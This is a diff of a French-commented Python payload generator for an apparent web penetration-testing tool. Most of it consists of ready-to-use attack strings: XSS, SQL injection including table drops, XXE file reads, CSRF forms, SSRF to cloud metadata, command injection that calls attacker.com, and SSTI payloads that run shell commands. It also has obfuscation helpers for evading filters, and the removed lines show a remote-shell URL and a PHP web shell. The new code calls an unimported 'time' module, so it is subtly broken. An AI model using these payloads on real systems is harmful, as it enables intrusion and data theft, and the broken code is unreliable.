@@ -1,620 +1,344 @@
 """
 Module de génération de charges utiles personnalisées pour WebPhantom.
-Ce module permet de créer, gérer et utiliser des charges utiles (payloads)
-personnalisées pour différents types d'attaques et de tests de pénétration.
+Supporte différents types d'attaques et transformations.
 """
 
 import os
-import re
 import json
+import base64
+import urllib.parse
 import random
 import string
-import base64
 import logging
-import hashlib
-import urllib.parse
-from pathlib import Path
+import html
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+from Crypto.Util.Padding import pad
+from Crypto.Random import get_random_bytes
 
 # Configuration du logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-logger = logging.getLogger("payload_generator")
+logger = logging.getLogger(__name__)
 
-# Répertoire pour stocker les charges utiles personnalisées
-PAYLOADS_DIR = os.path.expanduser("~/.webphantom/payloads")
+# Répertoire pour stocker les charges utiles
+PAYLOAD_DIR = os.path.expanduser("~/.webphantom/payloads")
+os.makedirs(PAYLOAD_DIR, exist_ok=True)
 
-# Catégories de charges utiles
-PAYLOAD_CATEGORIES = {
-    "xss": "Cross-Site Scripting",
-    "sqli": "SQL Injection",
-    "lfi": "Local File Inclusion",
-    "rfi": "Remote File Inclusion",
-    "csrf": "Cross-Site Request Forgery",
-    "ssrf": "Server-Side Request Forgery",
-    "xxe": "XML External Entity",
-    "rce": "Remote Code Execution",
-    "ssti": "Server-Side Template Injection",
-    "jwt": "JWT Attacks",
-    "nosqli": "NoSQL Injection",
-    "custom": "Custom Payloads"
-}
-
-# Charges utiles par défaut
+# Charges utiles prédéfinies par catégorie
 DEFAULT_PAYLOADS = {
     "xss": [
-        "<script>alert('XSS')</script>",
-        "<img src=x onerror=alert('XSS')>",
-        "<svg onload=alert('XSS')>",
-        "javascript:alert('XSS')",
-        "<iframe src=\"javascript:alert('XSS')\"></iframe>"
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "javascript:alert(1)",
+        "<body onload=alert(1)>",
+        "<iframe src=\"javascript:alert(1)\"></iframe>",
+        "<a href=\"javascript:alert(1)\">Click me</a>",
+        "<div onmouseover=\"alert(1)\">Hover me</div>"
     ],
     "sqli": [
         "' OR '1'='1",
         "' OR '1'='1' --",
         "' OR 1=1 --",
         "' UNION SELECT 1,2,3 --",
-        "' UNION SELECT username,password,3 FROM users --"
-    ],
-    "lfi": [
-        "../../../etc/passwd",
-        "../../../../etc/passwd",
-        "..%2f..%2f..%2fetc%2fpasswd",
-        "....//....//....//etc/passwd",
-        "/proc/self/environ"
-    ],
-    "rfi": [
-        "http://attacker.com/shell.php",
-        "https://attacker.com/shell.php",
-        "ftp://attacker.com/shell.php",
-        "//attacker.com/shell.php",
-        "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
-    ],
-    "csrf": [
-        "<img src='https://victim.com/transfer?to=attacker&amount=1000'>",
-        "<form action='https://victim.com/transfer' method='POST'><input type='hidden' name='to' value='attacker'><input type='hidden' name='amount' value='1000'><input type='submit' value='Click me'></form>",
-        "<script>fetch('https://victim.com/transfer?to=attacker&amount=1000')</script>"
-    ],
-    "ssrf": [
-        "http://localhost/admin",
-        "http://127.0.0.1/admin",
-        "http://[::1]/admin",
-        "http://internal-service/api",
-        "file:///etc/passwd"
+        "' UNION SELECT username,password,3 FROM users --",
+        "1'; DROP TABLE users; --",
+        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --"
     ],
     "xxe": [
-        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
-        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>",
-        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><data>&send;</data>"
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://internal.service/secret\">]><foo>&xxe;</foo>"
     ],
-    "rce": [
-        ";ls -la",
-        "& cat /etc/passwd",
-        "| id",
-        "$(id)",
-        "`id`"
+    "csrf": [
+        "<form action=\"http://example.com/api/account\" method=\"POST\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"><input type=\"submit\" value=\"Click me\"></form>",
+        "<img src=\"http://example.com/api/account?email=attacker@evil.com\" style=\"display:none\">",
+        "<script>fetch('http://example.com/api/account', {method:'POST',body:JSON.stringify({email:'attacker@evil.com'}),headers:{'Content-Type':'application/json'}});</script>"
+    ],
+    "ssrf": [
+        "http://localhost:8080/admin",
+        "http://127.0.0.1:8080/admin",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://internal-service/api/keys",
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:25/xHELO%20localhost"
+    ],
+    "command_injection": [
+        "; ls -la",
+        "& dir",
+        "| cat /etc/passwd",
+        "`cat /etc/passwd`",
+        "$(cat /etc/passwd)",
+        "; ping -c 4 attacker.com",
+        "| nslookup attacker.com"
+    ],
+    "path_traversal": [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\win.ini",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "/var/www/../../etc/passwd"
     ],
     "ssti": [
-        "{{7*7}}",
         "${7*7}",
+        "{{7*7}}",
         "<%= 7*7 %>",
-        "#{7*7}",
-        "{7*7}"
-    ],
-    "jwt": [
-        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
-        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
-    ],
-    "nosqli": [
-        "username[$ne]=admin&password[$ne]=",
-        "username[$regex]=^adm&password[$ne]=",
-        "username[$exists]=true",
-        "{\"username\": {\"$ne\": null}}",
-        "{\"username\": {\"$in\": [\"admin\", \"root\", \"superuser\"]}}"
+        "${@java.lang.Runtime@getRuntime().exec('id')}",
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
     ]
 }
 
-class PayloadGenerator:
-    """Classe pour la génération et la gestion des charges utiles."""
-    
-    def __init__(self, payloads_dir=PAYLOADS_DIR):
-        self.payloads_dir = payloads_dir
-        os.makedirs(self.payloads_dir, exist_ok=True)
-        self._init_payloads()
-    
-    def _init_payloads(self):
-        """Initialise les charges utiles par défaut si elles n'existent pas."""
-        for category, payloads in DEFAULT_PAYLOADS.items():
-            category_dir = os.path.join(self.payloads_dir, category)
-            os.makedirs(category_dir, exist_ok=True)
-            
-            # Créer le fichier de charges utiles par défaut
-            default_file = os.path.join(category_dir, "default.json")
-            if not os.path.exists(default_file):
-                with open(default_file, "w") as f:
-                    json.dump({
-                        "name": f"Default {PAYLOAD_CATEGORIES.get(category, category.upper())} Payloads",
-                        "description": f"Charges utiles par défaut pour {PAYLOAD_CATEGORIES.get(category, category.upper())}",
-                        "payloads": payloads
-                    }, f, indent=2)
-    
-    def get_categories(self):
-        """
-        Récupère la liste des catégories de charges utiles.
-        
-        Returns:
-            dict: Dictionnaire des catégories
-        """
-        return PAYLOAD_CATEGORIES
-    
-    def get_payload_sets(self, category=None):
-        """
-        Récupère les ensembles de charges utiles.
-        
-        Args:
-            category: Catégorie de charges utiles (optionnel)
-            
-        Returns:
-            dict: Dictionnaire des ensembles de charges utiles
-        """
-        result = {}
-        
-        if category:
-            category_dir = os.path.join(self.payloads_dir, category)
-            if not os.path.exists(category_dir):
-                logger.warning(f"Catégorie de charges utiles inexistante: {category}")
-                return {}
-            
-            # Récupérer les fichiers JSON dans la catégorie
-            for file_name in os.listdir(category_dir):
-                if file_name.endswith(".json"):
-                    file_path = os.path.join(category_dir, file_name)
-                    try:
-                        with open(file_path, "r") as f:
-                            payload_set = json.load(f)
-                            set_name = file_name[:-5]  # Supprimer l'extension .json
-                            result[set_name] = payload_set
-                    except Exception as e:
-                        logger.error(f"Erreur lors de la lecture du fichier {file_path}: {e}")
-        else:
-            # Récupérer toutes les catégories
-            for category in os.listdir(self.payloads_dir):
-                category_dir = os.path.join(self.payloads_dir, category)
-                if os.path.isdir(category_dir):
-                    result[category] = {}
-                    
-                    # Récupérer les fichiers JSON dans la catégorie
-                    for file_name in os.listdir(category_dir):
-                        if file_name.endswith(".json"):
-                            file_path = os.path.join(category_dir, file_name)
-                            try:
-                                with open(file_path, "r") as f:
-                                    payload_set = json.load(f)
-                                    set_name = file_name[:-5]  # Supprimer l'extension .json
-                                    result[category][set_name] = payload_set
-                            except Exception as e:
-                                logger.error(f"Erreur lors de la lecture du fichier {file_path}: {e}")
-        
-        return result
-    
-    def get_payloads(self, category, set_name="default"):
-        """
-        Récupère les charges utiles d'un ensemble.
-        
-        Args:
-            category: Catégorie de charges utiles
-            set_name: Nom de l'ensemble de charges utiles (par défaut: "default")
-            
-        Returns:
-            list: Liste des charges utiles
-        """
-        file_path = os.path.join(self.payloads_dir, category, f"{set_name}.json")
-        if not os.path.exists(file_path):
-            logger.warning(f"Ensemble de charges utiles inexistant: {category}/{set_name}")
-            return []
-        
-        try:
-            with open(file_path, "r") as f:
-                payload_set = json.load(f)
-                return payload_set.get("payloads", [])
-        except Exception as e:
-            logger.error(f"Erreur lors de la lecture du fichier {file_path}: {e}")
-            return []
-    
-    def create_payload_set(self, category, set_name, name, description, payloads):
-        """
-        Crée un nouvel ensemble de charges utiles.
-        
-        Args:
-            category: Catégorie de charges utiles
-            set_name: Nom de l'ensemble de charges utiles
-            name: Nom complet de l'ensemble
-            description: Description de l'ensemble
-            payloads: Liste des charges utiles
-            
-        Returns:
-            bool: True si la création a réussi, False sinon
-        """
-        # Vérifier que la catégorie existe
-        if category not in PAYLOAD_CATEGORIES and category != "custom":
-            logger.error(f"Catégorie de charges utiles invalide: {category}")
-            return False
-        
-        # Créer le répertoire de la catégorie s'il n'existe pas
-        category_dir = os.path.join(self.payloads_dir, category)
-        os.makedirs(category_dir, exist_ok=True)
-        
-        # Créer le fichier de charges utiles
-        file_path = os.path.join(category_dir, f"{set_name}.json")
-        
-        try:
-            with open(file_path, "w") as f:
-                json.dump({
-                    "name": name,
-                    "description": description,
-                    "payloads": payloads
-                }, f, indent=2)
-            
-            logger.info(f"Ensemble de charges utiles créé: {category}/{set_name}")
-            return True
-        except Exception as e:
-            logger.error(f"Erreur lors de la création de l'ensemble de charges utiles: {e}")
-            return False
-    
-    def update_payload_set(self, category, set_name, **kwargs):
-        """
-        Met à jour un ensemble de charges utiles.
-        
-        Args:
-            category: Catégorie de charges utiles
-            set_name: Nom de l'ensemble de charges utiles
-            **kwargs: Champs à mettre à jour (name, description, payloads)
-            
-        Returns:
-            bool: True si la mise à jour a réussi, False sinon
-        """
-        file_path = os.path.join(self.payloads_dir, category, f"{set_name}.json")
-        if not os.path.exists(file_path):
-            logger.warning(f"Ensemble de charges utiles inexistant: {category}/{set_name}")
-            return False
-        
-        try:
-            # Lire l'ensemble existant
-            with open(file_path, "r") as f:
-                payload_set = json.load(f)
-            
-            # Mettre à jour les champs
-            if "name" in kwargs:
-                payload_set["name"] = kwargs["name"]
-            
-            if "description" in kwargs:
-                payload_set["description"] = kwargs["description"]
-            
-            if "payloads" in kwargs:
-                payload_set["payloads"] = kwargs["payloads"]
-            
-            # Sauvegarder l'ensemble mis à jour
-            with open(file_path, "w") as f:
-                json.dump(payload_set, f, indent=2)
-            
-            logger.info(f"Ensemble de charges utiles mis à jour: {category}/{set_name}")
-            return True
-        except Exception as e:
-            logger.error(f"Erreur lors de la mise à jour de l'ensemble de charges utiles: {e}")
-            return False
-    
-    def delete_payload_set(self, category, set_name):
-        """
-        Supprime un ensemble de charges utiles.
-        
-        Args:
-            category: Catégorie de charges utiles
-            set_name: Nom de l'ensemble de charges utiles
-            
-        Returns:
-            bool: True si la suppression a réussi, False sinon
-        """
-        file_path = os.path.join(self.payloads_dir, category, f"{set_name}.json")
-        if not os.path.exists(file_path):
-            logger.warning(f"Ensemble de charges utiles inexistant: {category}/{set_name}")
-            return False
-        
-        try:
-            os.remove(file_path)
-            logger.info(f"Ensemble de charges utiles supprimé: {category}/{set_name}")
-            return True
-        except Exception as e:
-            logger.error(f"Erreur lors de la suppression de l'ensemble de charges utiles: {e}")
-            return False
-    
-    def get_random_payload(self, category, set_name="default"):
-        """
-        Récupère une charge utile aléatoire d'un ensemble.
-        
-        Args:
-            category: Catégorie de charges utiles
-            set_name: Nom de l'ensemble de charges utiles (par défaut: "default")
-            
-        Returns:
-            str: Charge utile aléatoire ou None si l'ensemble est vide
-        """
-        payloads = self.get_payloads(category, set_name)
-        if not payloads:
-            return None
-        
-        return random.choice(payloads)
-    
-    def generate_custom_payload(self, template, **kwargs):
-        """
-        Génère une charge utile personnalisée à partir d'un template.
-        
-        Args:
-            template: Template de charge utile avec des placeholders {variable}
-            **kwargs: Variables à remplacer dans le template
-            
-        Returns:
-            str: Charge utile générée
-        """
-        try:
-            return template.format(**kwargs)
-        except KeyError as e:
-            logger.error(f"Variable manquante dans le template: {e}")
-            return template
-        except Exception as e:
-            logger.error(f"Erreur lors de la génération de la charge utile: {e}")
-            return template
-
-class PayloadTransformer:
-    """Classe pour la transformation des charges utiles."""
-    
-    @staticmethod
-    def url_encode(payload, double=False):
-        """
-        Encode une charge utile en URL.
-        
-        Args:
-            payload: Charge utile à encoder
-            double: Si True, effectue un double encodage
-            
-        Returns:
-            str: Charge utile encodée
-        """
-        encoded = urllib.parse.quote(payload)
-        if double:
-            encoded = urllib.parse.quote(encoded)
-        return encoded
-    
-    @staticmethod
-    def html_encode(payload):
-        """
-        Encode une charge utile en HTML.
-        
-        Args:
-            payload: Charge utile à encoder
-            
-        Returns:
-            str: Charge utile encodée
-        """
-        return payload.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&#x27;")
-    
-    @staticmethod
-    def base64_encode(payload):
-        """
-        Encode une charge utile en Base64.
-        
-        Args:
-            payload: Charge utile à encoder
-            
-        Returns:
-            str: Charge utile encodée
-        """
-        return base64.b64encode(payload.encode()).decode()
-    
-    @staticmethod
-    def hex_encode(payload):
-        """
-        Encode une charge utile en hexadécimal.
-        
-        Args:
-            payload: Charge utile à encoder
-            
-        Returns:
-            str: Charge utile encodée
-        """
-        return "".join(f"\\x{ord(c):02x}" for c in payload)
-    
-    @staticmethod
-    def unicode_encode(payload):
-        """
-        Encode une charge utile en Unicode.
-        
-        Args:
-            payload: Charge utile à encoder
-            
-        Returns:
-            str: Charge utile encodée
-        """
-        return "".join(f"\\u{ord(c):04x}" for c in payload)
-    
-    @staticmethod
-    def encrypt_aes(payload, key):
-        """
-        Chiffre une charge utile avec AES.
-        
-        Args:
-            payload: Charge utile à chiffrer
-            key: Clé de chiffrement (doit être de 16, 24 ou 32 octets)
-            
-        Returns:
-            str: Charge utile chiffrée (en Base64)
-        """
-        try:
-            # S'assurer que la clé a la bonne longueur
-            if len(key) not in (16, 24, 32):
-                key = hashlib.sha256(key.encode()).digest()[:32]
-            else:
-                key = key.encode()
-            
-            # Chiffrer la charge utile
-            cipher = AES.new(key, AES.MODE_CBC)
-            ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
-            iv = base64.b64encode(cipher.iv).decode()
-            ct = base64.b64encode(ct_bytes).decode()
-            return f"{iv}:{ct}"
-        except Exception as e:
-            logger.error(f"Erreur lors du chiffrement AES: {e}")
-            return payload
-    
-    @staticmethod
-    def decrypt_aes(encrypted_payload, key):
-        """
-        Déchiffre une charge utile avec AES.
-        
-        Args:
-            encrypted_payload: Charge utile chiffrée (en Base64)
-            key: Clé de chiffrement (doit être de 16, 24 ou 32 octets)
-            
-        Returns:
-            str: Charge utile déchiffrée
-        """
-        try:
-            # S'assurer que la clé a la bonne longueur
-            if len(key) not in (16, 24, 32):
-                key = hashlib.sha256(key.encode()).digest()[:32]
-            else:
-                key = key.encode()
-            
-            # Déchiffrer la charge utile
-            iv, ct = encrypted_payload.split(":")
-            iv = base64.b64decode(iv)
-            ct = base64.b64decode(ct)
-            cipher = AES.new(key, AES.MODE_CBC, iv)
-            pt = unpad(cipher.decrypt(ct), AES.block_size)
-            return pt.decode()
-        except Exception as e:
-            logger.error(f"Erreur lors du déchiffrement AES: {e}")
-            return encrypted_payload
-    
-    @staticmethod
-    def obfuscate_js(payload):
-        """
-        Obfusque une charge utile JavaScript.
-        
-        Args:
-            payload: Charge utile JavaScript à obfusquer
-            
-        Returns:
-            str: Charge utile obfusquée
-        """
-        try:
-            # Méthode simple d'obfuscation: convertir en Unicode
-            return "eval('" + "".join(f"\\x{ord(c):02x}" for c in payload) + "')"
-        except Exception as e:
-            logger.error(f"Erreur lors de l'obfuscation JavaScript: {e}")
-            return payload
-    
-    @staticmethod
-    def obfuscate_sql(payload):
-        """
-        Obfusque une charge utile SQL.
-        
-        Args:
-            payload: Charge utile SQL à obfusquer
-            
-        Returns:
-            str: Charge utile obfusquée
-        """
-        try:
-            # Méthode simple d'obfuscation: ajouter des commentaires et des espaces
-            # Préserver les mots-clés SQL pour les tests
-            sql_keywords = ["SELECT", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER"]
-            result = payload
-            
-            # Ajouter des commentaires aléatoires entre les caractères
-            chars = list(result)
-            for i in range(len(chars) - 1, 0, -1):
-                if random.random() < 0.2:
-                    chars.insert(i, f"/*{random.randint(1000, 9999)}*/")
-            
-            result = "".join(chars)
-            
-            # Ajouter des espaces aléatoires
-            result = re.sub(r'\s+', lambda m: ' ' * random.randint(1, 5), result)
-            
-            return result
-        except Exception as e:
-            logger.error(f"Erreur lors de l'obfuscation SQL: {e}")
-            return payload
-
-def run(category=None, set_name=None, transform=None):
+def generate(payload_type, transform=None, output=None, custom_payloads=None):
     """
-    Point d'entrée principal pour la génération de charges utiles.
+    Génère des charges utiles personnalisées.
     
     Args:
-        category: Catégorie de charges utiles (optionnel)
-        set_name: Nom de l'ensemble de charges utiles (optionnel)
-        transform: Transformation à appliquer (optionnel)
-    """
-    generator = PayloadGenerator()
-    transformer = PayloadTransformer()
-    
-    if not category:
-        # Afficher les catégories disponibles
-        print("[*] Catégories de charges utiles disponibles:")
-        for cat_id, cat_name in PAYLOAD_CATEGORIES.items():
-            print(f"  - {cat_id}: {cat_name}")
-        return
-    
-    if category not in PAYLOAD_CATEGORIES and category != "custom":
-        print(f"[!] Catégorie de charges utiles invalide: {category}")
-        return
-    
-    if not set_name:
-        # Afficher les ensembles disponibles dans la catégorie
-        print(f"[*] Ensembles de charges utiles disponibles pour {category}:")
-        payload_sets = generator.get_payload_sets(category)
-        for set_id, payload_set in payload_sets.items():
-            print(f"  - {set_id}: {payload_set.get('name', set_id)}")
-        return
-    
-    # Récupérer les charges utiles
-    payloads = generator.get_payloads(category, set_name)
-    
-    if not payloads:
-        print(f"[!] Aucune charge utile trouvée pour {category}/{set_name}")
-        return
-    
-    print(f"[*] Charges utiles pour {category}/{set_name}:")
-    
-    for i, payload in enumerate(payloads):
-        # Appliquer la transformation si demandée
-        if transform:
-            if transform == "url":
-                payload = transformer.url_encode(payload)
-            elif transform == "url2":
-                payload = transformer.url_encode(payload, double=True)
-            elif transform == "html":
-                payload = transformer.html_encode(payload)
-            elif transform == "base64":
-                payload = transformer.base64_encode(payload)
-            elif transform == "hex":
-                payload = transformer.hex_encode(payload)
-            elif transform == "unicode":
-                payload = transformer.unicode_encode(payload)
-            elif transform == "js_obfuscate":
-                payload = transformer.obfuscate_js(payload)
-            elif transform == "sql_obfuscate":
-                payload = transformer.obfuscate_sql(payload)
+        payload_type (str): Type de charge utile (xss, sqli, xxe, etc.)
+        transform (str, optional): Transformation à appliquer (url, html, base64, etc.)
+        output (str, optional): Chemin du fichier de sortie
+        custom_payloads (list, optional): Liste de charges utiles personnalisées
         
-        print(f"  {i+1}. {payload}")
-
-if __name__ == "__main__":
-    import sys
+    Returns:
+        dict: Résultat de la génération
+    """
+    logger.info(f"Génération de charges utiles de type {payload_type}")
     
-    if len(sys.argv) > 1:
-        category = sys.argv[1]
-        set_name = sys.argv[2] if len(sys.argv) > 2 else None
-        transform = sys.argv[3] if len(sys.argv) > 3 else None
-        run(category, set_name, transform)
+    # Vérifier si le type de charge utile est supporté
+    if payload_type not in DEFAULT_PAYLOADS and not custom_payloads:
+        logger.error(f"Type de charge utile non supporté: {payload_type}")
+        return {"success": False, "error": f"Type de charge utile non supporté: {payload_type}"}
+    
+    # Utiliser les charges utiles personnalisées si fournies, sinon utiliser les charges utiles par défaut
+    payloads = custom_payloads if custom_payloads else DEFAULT_PAYLOADS.get(payload_type, [])
+    
+    # Appliquer la transformation si demandée
+    if transform:
+        transformed_payloads = []
+        for payload in payloads:
+            transformed = apply_transform(payload, transform)
+            transformed_payloads.append({
+                "original": payload,
+                "transformed": transformed,
+                "transform": transform
+            })
+        result_payloads = transformed_payloads
     else:
-        run()
+        result_payloads = payloads
+    
+    # Créer le résultat
+    result = {
+        "type": payload_type,
+        "count": len(result_payloads),
+        "payloads": result_payloads
+    }
+    
+    # Sauvegarder dans un fichier si demandé
+    if output:
+        try:
+            with open(output, "w") as f:
+                json.dump(result, f, indent=2)
+            logger.info(f"Charges utiles sauvegardées dans {output}")
+            result["output_file"] = output
+        except Exception as e:
+            logger.error(f"Erreur lors de la sauvegarde des charges utiles: {str(e)}")
+            result["error"] = f"Erreur lors de la sauvegarde: {str(e)}"
+    
+    # Afficher un résumé
+    print(f"[+] {len(result_payloads)} charge(s) utile(s) de type {payload_type} générée(s)")
+    if transform:
+        print(f"[+] Transformation appliquée: {transform}")
+    if output:
+        print(f"[+] Résultats sauvegardés dans {output}")
+    
+    return result
+
+def apply_transform(payload, transform):
+    """
+    Applique une transformation à une charge utile.
+    
+    Args:
+        payload (str): Charge utile à transformer
+        transform (str): Type de transformation (url, html, base64, etc.)
+        
+    Returns:
+        str: Charge utile transformée
+    """
+    if transform == "url":
+        return urllib.parse.quote(payload)
+    elif transform == "double_url":
+        return urllib.parse.quote(urllib.parse.quote(payload))
+    elif transform == "html":
+        return html.escape(payload)
+    elif transform == "base64":
+        return base64.b64encode(payload.encode()).decode()
+    elif transform == "hex":
+        return payload.encode().hex()
+    elif transform == "unicode":
+        return "".join([f"\\u{ord(c):04x}" for c in payload])
+    elif transform == "js_obfuscate":
+        return js_obfuscate(payload)
+    elif transform == "sql_obfuscate":
+        return sql_obfuscate(payload)
+    elif transform == "encrypt_aes":
+        return encrypt_aes(payload)
+    else:
+        logger.warning(f"Transformation non supportée: {transform}")
+        return payload
+
+def js_obfuscate(payload):
+    """
+    Obfuscation JavaScript simple.
+    
+    Args:
+        payload (str): Code JavaScript à obfusquer
+        
+    Returns:
+        str: Code JavaScript obfusqué
+    """
+    # Convertir en représentation Unicode
+    unicode_payload = "".join([f"\\x{ord(c):02x}" for c in payload])
+    
+    # Créer une fonction d'évaluation
+    obfuscated = f"eval('{unicode_payload}')"
+    
+    return obfuscated
+
+def sql_obfuscate(payload):
+    """
+    Obfuscation SQL simple.
+    
+    Args:
+        payload (str): Requête SQL à obfusquer
+        
+    Returns:
+        str: Requête SQL obfusquée
+    """
+    # Remplacer les espaces par des commentaires
+    obfuscated = payload.replace(" ", "/**/")
+    
+    # Utiliser des chaînes concaténées pour les mots-clés courants
+    keywords = ["SELECT", "FROM", "WHERE", "UNION", "AND", "OR", "INSERT", "UPDATE", "DELETE"]
+    for keyword in keywords:
+        if keyword in obfuscated:
+            chars = [f"CHAR({ord(c)})" for c in keyword]
+            concat = "+".join(chars)
+            obfuscated = obfuscated.replace(keyword, f"CONCAT({concat})")
+    
+    return obfuscated
+
+def encrypt_aes(payload):
+    """
+    Chiffrement AES simple.
+    
+    Args:
+        payload (str): Texte à chiffrer
+        
+    Returns:
+        str: Texte chiffré en base64
+    """
+    key = get_random_bytes(16)
+    cipher = AES.new(key, AES.MODE_CBC)
+    ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
+    iv = base64.b64encode(cipher.iv).decode('utf-8')
+    ct = base64.b64encode(ct_bytes).decode('utf-8')
+    key_b64 = base64.b64encode(key).decode('utf-8')
+    
+    return f"{iv}:{ct}:{key_b64}"
+
+def create_custom_payload_set(name, payload_type, payloads, description=None):
+    """
+    Crée un ensemble de charges utiles personnalisées.
+    
+    Args:
+        name (str): Nom de l'ensemble
+        payload_type (str): Type de charge utile
+        payloads (list): Liste des charges utiles
+        description (str, optional): Description de l'ensemble
+        
+    Returns:
+        dict: Résultat de la création
+    """
+    logger.info(f"Création d'un ensemble de charges utiles personnalisées: {name}")
+    
+    # Créer le fichier de l'ensemble
+    filename = f"{name.lower().replace(' ', '_')}.json"
+    filepath = os.path.join(PAYLOAD_DIR, filename)
+    
+    # Créer l'ensemble
+    payload_set = {
+        "name": name,
+        "type": payload_type,
+        "description": description or f"Ensemble de charges utiles {payload_type} personnalisées",
+        "count": len(payloads),
+        "payloads": payloads,
+        "created_at": time.strftime("%Y-%m-%d %H:%M:%S")
+    }
+    
+    # Sauvegarder l'ensemble
+    try:
+        with open(filepath, "w") as f:
+            json.dump(payload_set, f, indent=2)
+        logger.info(f"Ensemble de charges utiles sauvegardé dans {filepath}")
+        return {"success": True, "file": filepath, "count": len(payloads)}
+    except Exception as e:
+        logger.error(f"Erreur lors de la sauvegarde de l'ensemble de charges utiles: {str(e)}")
+        return {"success": False, "error": str(e)}
+
+def load_custom_payload_set(name):
+    """
+    Charge un ensemble de charges utiles personnalisées.
+    
+    Args:
+        name (str): Nom de l'ensemble
+        
+    Returns:
+        dict: Ensemble de charges utiles
+    """
+    logger.info(f"Chargement de l'ensemble de charges utiles: {name}")
+    
+    # Construire le chemin du fichier
+    filename = f"{name.lower().replace(' ', '_')}.json"
+    filepath = os.path.join(PAYLOAD_DIR, filename)
+    
+    # Vérifier si le fichier existe
+    if not os.path.exists(filepath):
+        logger.error(f"Ensemble de charges utiles non trouvé: {name}")
+        return {"success": False, "error": f"Ensemble non trouvé: {name}"}
+    
+    # Charger l'ensemble
+    try:
+        with open(filepath, "r") as f:
+            payload_set = json.load(f)
+        logger.info(f"Ensemble de charges utiles chargé: {name}")
+        return {"success": True, "payload_set": payload_set}
+    except Exception as e:
+        logger.error(f"Erreur lors du chargement de l'ensemble de charges utiles: {str(e)}")
+        return {"success": False, "error": str(e)}
+
+def run(url, options=None):
+    """
+    Fonction principale pour l'exécution du module de génération de charges utiles.
+    
+    Args:
+        url (str): URL cible (non utilisée pour ce module)
+        options (dict, optional): Options supplémentaires
+        
+    Returns:
+        dict: Résultat de l'opération
+    """
+    if not options:
+        options = {}
+    
+    payload_type = options.get("type", "xss")
+    transform = options.get("transform", None)
+    output = options.get("output", None)
+    
+    # Si aucun fichier de sortie n'est spécifié, en créer un dans le répertoire des résultats
+    if not output and options.get("results_dir"):
+        output = os.path.join(options.get("results_dir"), f"{payload_type}_payloads.json")
+    
+    logger.info(f"Génération de charges utiles de type {payload_type}")
+    result = generate(payload_type, transform, output)
+    
+    return result
